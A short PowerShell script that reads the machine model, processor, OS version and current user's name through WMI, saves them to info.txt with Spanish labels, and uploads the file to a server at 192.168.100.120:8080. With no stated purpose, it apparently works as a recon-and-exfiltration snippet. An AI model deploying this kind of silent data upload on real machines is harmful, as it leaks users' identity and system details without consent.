$systemInfo = Get-WmiObject Win32_ComputerSystem
$osInfo = Get-WmiObject Win32_OperatingSystem
$processorInfo = Get-WmiObject Win32_Processor

 

$currentUsername = $env:USERNAME
$currentUserInfo = Get-WmiObject Win32_UserAccount | Where-Object {$_.Name -eq $currentUsername}

 

$outputFilePath = "info.txt"
$outputText = @"
Información del sistema:
Sistema: $($systemInfo.Model)
Procesador: $($processorInfo.Name)
Sistema operativo: $($osInfo.Version)
Usuario actual: $($currentUserInfo.FullName) ($($currentUserInfo.Name))
"@

 

$outputText | Out-File -FilePath $outputFilePath

 

$serverUrl = "http://192.168.100.120:8080"
$fileName = "info.txt"

 

$webClient = New-Object System.Net.WebClient
$webClient.UploadFile("$serverUrl/$fileName", $outputFilePath)